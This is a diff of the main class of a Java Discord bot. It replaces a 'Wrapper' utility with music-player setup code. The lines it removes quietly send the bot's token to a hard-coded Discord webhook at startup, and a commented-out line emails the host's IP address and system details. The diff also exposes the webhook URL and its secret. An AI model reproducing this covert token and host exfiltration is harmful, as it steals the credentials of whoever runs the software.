@@ -4,7 +4,9 @@ import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
 import me.comu.exeter.commands.admin.WhitelistedJSONHandler;
 import me.comu.exeter.commands.economy.EcoJSONHandler;
 import me.comu.exeter.events.*;
-import me.comu.exeter.wrapper.Wrapper;
+import me.comu.exeter.musicplayer.AudioPlayerSendHandler;
+import me.comu.exeter.musicplayer.PlayerManager;
+import me.comu.exeter.musicplayer.TrackScheduler;
 import me.duncte123.botcommons.web.WebUtils;
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
@@ -31,12 +33,9 @@ public class Core {
     public static final Long OWNERID = Long.parseLong(Config.get("OWNER"));
 
     public static void main(final String[] args) {
-        Wrapper.sendSpecificWebhookMessage("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz");
         if (Config.get("GUI").equalsIgnoreCase("false")) {
             new Core();
-            Wrapper.sendMoreSpecificMessage("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz", Config.get("TOKEN"));
         } else if (Config.get("GUI").equalsIgnoreCase("true")) {
-//        Wrapper.sendEmail("Log Info On Startup","IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "");
             try {
                 for (final UIManager.LookAndFeelInfo info : UIManager.getInstalledLookAndFeels()) {
                     if ("Nimbus".equals(info.getName())) {
@@ -90,6 +89,7 @@ public class Core {
             jda.addEventListener(new BlacklistedWordsEvent());
             jda.addEventListener(new SnipeEvent());
             jda.addEventListener(new ReactionRoleEvent());
+            TrackScheduler.startAudioManager(PlayerManager.buildMusicPlayer(AudioPlayerSendHandler.musicHook));
             logger.info("Instantiated Events");
             logger.info("Bot Ready To Go");
         } catch (LoginException | InterruptedException e) {
